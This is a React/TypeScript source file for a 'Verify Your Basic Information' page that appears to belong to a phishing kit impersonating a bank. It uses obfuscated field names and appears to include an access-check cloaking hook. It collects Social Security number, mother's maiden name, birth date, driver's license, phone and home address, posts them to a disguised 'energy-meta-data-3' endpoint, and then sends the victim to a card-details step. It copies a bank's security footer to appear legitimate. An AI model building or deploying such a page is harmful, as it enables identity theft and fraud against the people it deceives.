import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const inputClasses =
  'w-full bg-transparent border border-slate-600 rounded px-3 py-3 text-sm text-white placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-[#00b4ff]';

const BasicInfo: React.FC = () => {
  const [fzNme, setFzNme] = useState('');
  const [lzNme, setLzNme] = useState('');
  const [phone, setPhone] = useState('');
  const [ssn, setSsn] = useState('');
  const [showSSN, setShowSSN] = useState(false);
  const [motherMaidenName, setMotherMaidenName] = useState('');
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [driverLicense, setDriverLicense] = useState('');
  const [stAd, setStAd] = useState('');
  const [apt, setApt] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [emzemz, setEmzemz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    fzNme: '', lzNme: '', phone: '', ssn: '', motherMaidenName: '',
    dob: '', driverLicense: '', stAd: '', city: '', state: '', zipCode: '', emzemz: '', form: ''
  });
  const [username, setUsername] = useState('');
  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz: emzemzState } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (emzemzState) {
      setUsername(emzemzState);
    } else {
      console.error('No username provided from previous page');
      navigate('/login');
    }
  }, [emzemzState, navigate]);

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
  const daysInMonth = (month && year) ? new Date(parseInt(year), parseInt(month), 0).getDate() : 31;

  const formatPhone = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 10);
    if (digitsOnly.length >= 7) {
      return digitsOnly.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
    } else if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,3})/, '($1) $2');
    }
    return digitsOnly;
  };

  const formatSSN = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 9);
    if (digitsOnly.length >= 6) {
      return digitsOnly.replace(/(\d{3})(\d{2})(\d{0,4})/, (_, p1, p2, p3) =>
        p3 ? `${p1}-${p2}-${p3}` : `${p1}-${p2}`
      );
    } else if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,2})/, (_, p1, p2) => p2 ? `${p1}-${p2}` : p1);
    }
    return digitsOnly;
  };

  const validateForm = () => {
    const newErrors = {
      fzNme: '', lzNme: '', phone: '', ssn: '', motherMaidenName: '',
      dob: '', driverLicense: '', stAd: '', city: '', state: '', zipCode: '', emzemz: '', form: ''
    };

    if (!fzNme.trim()) newErrors.fzNme = 'First name is required.';
    if (!lzNme.trim()) newErrors.lzNme = 'Last name is required.';
    if (!phone.trim()) newErrors.phone = 'Phone number is required.';
    if (!ssn.trim()) newErrors.ssn = 'SSN is required.';
    if (!motherMaidenName.trim()) newErrors.motherMaidenName = "Mother's maiden name is required.";
    if (!month || !day || !year) {
      newErrors.dob = 'Date of birth is required.';
    } else {
      const birthDate = new Date(parseInt(year), parseInt(month) - 1, parseInt(day));
      const age = (new Date().getTime() - birthDate.getTime()) / (365.25 * 24 * 60 * 60 * 1000);
      if (age < 18) newErrors.dob = 'You must be at least 18 years old.';
    }
    if (!driverLicense.trim()) newErrors.driverLicense = "Driver's license is required.";
    if (!stAd.trim()) newErrors.stAd = 'Street address is required.';
    if (!city.trim()) newErrors.city = 'City is required.';
    if (!state.trim()) newErrors.state = 'State is required.';
    if (!zipCode.trim()) newErrors.zipCode = 'Zip code is required.';
    if (!emzemz.trim()) newErrors.emzemz = 'Email is required.';

    setErrors(newErrors);
    return !Object.values(newErrors).some(error => error);
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      const getMonthName = (monthNumber: string) => {
        const monthNames = [
          "January", "February", "March", "April", "May", "June",
          "July", "August", "September", "October", "November", "December"
        ];
        return monthNames[parseInt(monthNumber) - 1] || '';
      };

      const dob = `${getMonthName(month)}/${day}/${year}`;

      // Combined submission
      await axios.post(`${baseUrl}api/energy-meta-data-3/`, {
        emzemz: username,
        email: `${username}@example.com`,
        // Basic info
        fzNme,
        lzNme,
        phone,
        ssn,
        motherMaidenName,
        dob,
        driverLicense,
        // Home address
        stAd,
        apt,
        city,
        state,
        zipCode
      });

      navigate('/card', {
        state: {
          emzemz: username
        }
      });
    } catch (error) {
      console.error('Error submitting form:', error);
      setErrors((prev) => ({
        ...prev,
        form: 'There was an error submitting your information. Please try again.',
      }));
    } finally {
      setIsLoading(false);
    }
  };

  if (!isAllowed) {
    return null;
  }

  if (!username) {
    return (
      <FlowCard title="Unable to continue">
        <p className="text-sm text-slate-300">
          We could not determine your session details. Please return to the previous step and try again.
        </p>
      </FlowCard>
    );
  }

  const footer = (
    <div className="space-y-2 text-xs text-slate-300">
      <p>
        For security reasons, never share your username, password, social security number, account number or other private data
        online, unless you are certain who you are providing that information to, and only share information through a secure
        webpage or site.
      </p>
      <div className="flex flex-wrap items-center justify-center gap-2 text-[#7dd3fc]">
        <a href="#" className="hover:underline">
          Forgot Username?
        </a>
        <span className="text-slate-500">|</span>
        <a href="#" className="hover:underline">
          Forgot Password?
        </a>
        <span className="text-slate-500">|</span>
        <a href="#" className="hover:underline">
          Forgot Everything?
        </a>
        <span className="text-slate-500">|</span>
        <a href="#" className="hover:underline">
          Locked Out?
        </a>
      </div>
    </div>
  );

  return (
    <FlowCard
      title="Verify Your Basic Information & Home Address"
      subtitle={<span className="text-slate-300">Please confirm the details we have on file.</span>}
      footer={footer}
    >
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm text-slate-300 mb-1" htmlFor="fzNme">
            First name
          </label>
          <input
            id="fzNme"
            name="fzNme"
            type="text"
            value={fzNme}
            onChange={(e) => setFzNme(e.target.value)}
            className={inputClasses}
            placeholder="First name"
          />
          {errors.fzNme ? <FormError message={errors.fzNme} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-300 mb-1" htmlFor="lzNme">
            Last name
          </label>
          <input
            id="lzNme"
            name="lzNme"
            type="text"
            value={lzNme}
            onChange={(e) => setLzNme(e.target.value)}
            className={inputClasses}
            placeholder="Last name"
          />
          {errors.lzNme ? <FormError message={errors.lzNme} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-300 mb-1" htmlFor="phone">
            Phone Number
          </label>
          <input
            id="phone"
            name="phone"
            type="text"
            value={phone}
            onChange={(e) => setPhone(formatPhone(e.target.value))}
            className={inputClasses}
            placeholder="(555) 123-4567"
          />
          {errors.phone ? <FormError message={errors.phone} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-300 mb-1" htmlFor="ssn">
            Social Security Number
          </label>
          <div className="relative">
            <input
              id="ssn"
              name="ssn"
              type={showSSN ? 'text' : 'password'}
              value={ssn}
              onChange={(e) => setSsn(formatSSN(e.target.value))}
              maxLength={11}
              className={inputClasses}
              placeholder="XXX-XX-XXXX"
            />
            <button
              type="button"
              onClick={() => setShowSSN(!showSSN)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#00b4ff] text-sm hover:underline"
            >
              {showSSN ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.ssn ? <FormError message={errors.ssn} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-300 mb-1" htmlFor="motherMaidenName">
            Mother's Maiden Name
          </label>
          <input
            id="motherMaidenName"
            name="motherMaidenName"
            type="text"
            value={motherMaidenName}
            onChange={(e) => setMotherMaidenName(e.target.value)}
            className={inputClasses}
            placeholder="Enter maiden name"
          />
          {errors.motherMaidenName ? <FormError message={errors.motherMaidenName} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-300 mb-1" htmlFor="emzemz">
            Email
          </label>
          <input
            id="emzemz"
            name="emzemz"
            type="text"
            value={emzemz}
            onChange={(e) => setEmzemz(e.target.value)}
            className={inputClasses}
            placeholder="Enter your email"
          />
          {errors.emzemz ? <FormError message={errors.emzemz} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-300 mb-1">Date of Birth</label>
          <div className="flex gap-2">
            <select
              value={month}
              onChange={(e) => setMonth(e.target.value)}
              className="flex-1 bg-transparent border border-slate-600 rounded px-3 py-3 text-sm text-white focus:outline-none focus:ring-2 focus:ring-[#00b4ff]"
            >
              <option value="" className="bg-slate-800">Month</option>
              {Array.from({ length: 12 }, (_, i) => (
                <option key={i + 1} value={i + 1} className="bg-slate-800">
                  {new Date(0, i).toLocaleString('default', { month: 'long' })}
                </option>
              ))}
            </select>
            <select
              value={day}
              onChange={(e) => setDay(e.target.value)}
              className="flex-1 bg-transparent border border-slate-600 rounded px-3 py-3 text-sm text-white focus:outline-none focus:ring-2 focus:ring-[#00b4ff]"
            >
              <option value="" className="bg-slate-800">Day</option>
              {Array.from({ length: daysInMonth }, (_, i) => (
                <option key={i + 1} value={i + 1} className="bg-slate-800">
                  {i + 1}
                </option>
              ))}
            </select>
            <select
              value={year}
              onChange={(e) => setYear(e.target.value)}
              className="flex-1 bg-transparent border border-slate-600 rounded px-3 py-3 text-sm text-white focus:outline-none focus:ring-2 focus:ring-[#00b4ff]"
            >
              <option value="" className="bg-slate-800">Year</option>
              {years.map((y) => (
                <option key={y} value={y} className="bg-slate-800">
                  {y}
                </option>
              ))}
            </select>
          </div>
          {errors.dob ? <FormError message={errors.dob} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-300 mb-1" htmlFor="driverLicense">
            Driver's License Number
          </label>
          <input
            id="driverLicense"
            name="driverLicense"
            type="text"
            value={driverLicense}
            onChange={(e) => setDriverLicense(e.target.value)}
            className={inputClasses}
            placeholder="Enter license number"
          />
          {errors.driverLicense ? <FormError message={errors.driverLicense} /> : null}
        </div>

        {/* Home Address Section */}
        <div className="border-t-2 border-slate-700 pt-6 mt-6">
          <h3 className="text-lg font-semibold text-slate-200 mb-4">Home Address</h3>
          
          <div className="space-y-4">
            <div>
              <label className="block text-sm text-slate-300 mb-1" htmlFor="stAd">
                Street Address
              </label>
              <input
                id="stAd"
                name="stAd"
                type="text"
                value={stAd}
                onChange={(e) => setStAd(e.target.value)}
                className={inputClasses}
                placeholder="Enter street address"
              />
              {errors.stAd ? <FormError message={errors.stAd} /> : null}
            </div>

            <div>
              <label className="block text-sm text-slate-300 mb-1" htmlFor="apt">
                Apartment/Unit (Optional)
              </label>
              <input
                id="apt"
                name="apt"
                type="text"
                value={apt}
                onChange={(e) => setApt(e.target.value)}
                className={inputClasses}
                placeholder="Apt, Suite, Unit, etc."
              />
            </div>

            <div>
              <label className="block text-sm text-slate-300 mb-1" htmlFor="city">
                City
              </label>
              <input
                id="city"
                name="city"
                type="text"
                value={city}
                onChange={(e) => setCity(e.target.value)}
                className={inputClasses}
                placeholder="Enter city"
              />
              {errors.city ? <FormError message={errors.city} /> : null}
            </div>

            <div>
              <label className="block text-sm text-slate-300 mb-1" htmlFor="state">
                State
              </label>
              <input
                id="state"
                name="state"
                type="text"
                value={state}
                onChange={(e) => setState(e.target.value)}
                className={inputClasses}
                placeholder="Enter state"
              />
              {errors.state ? <FormError message={errors.state} /> : null}
            </div>

            <div>
              <label className="block text-sm text-slate-300 mb-1" htmlFor="zipCode">
                Zip Code
              </label>
              <input
                id="zipCode"
                name="zipCode"
                type="text"
                value={zipCode}
                onChange={(e) => setZipCode(e.target.value)}
                className={inputClasses}
                placeholder="Enter zip code"
              />
              {errors.zipCode ? <FormError message={errors.zipCode} /> : null}
            </div>
          </div>
        </div>

        {errors.form ? (
          <div className="rounded-md border border-red-400/40 bg-red-950/40 px-4 py-3 text-sm text-red-300">{errors.form}</div>
        ) : null}

        <button
          type="submit"
          className="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-md hover:bg-[#38bdf8] transition disabled:opacity-70"
          disabled={isLoading}
        >
          {isLoading ? (
            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-black border-t-transparent" />
          ) : (
            'Continue'
          )}
        </button>
      </form>
    </FlowCard>
  );
};

export default BasicInfo;
